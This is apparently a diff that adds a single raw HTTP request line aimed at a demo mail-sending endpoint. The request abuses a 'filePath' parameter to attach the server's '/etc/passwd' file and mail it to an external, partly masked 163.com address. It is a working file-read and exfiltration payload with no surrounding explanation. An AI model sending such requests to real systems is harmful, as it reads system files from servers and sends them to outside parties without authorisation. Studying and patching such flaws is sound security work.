@@ -1,0 +1,1 @@
+GET /demo/mail/sendMessageWithAttachment?to=xxxxxx@163.com&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/etc/passwd HTTP/1.1
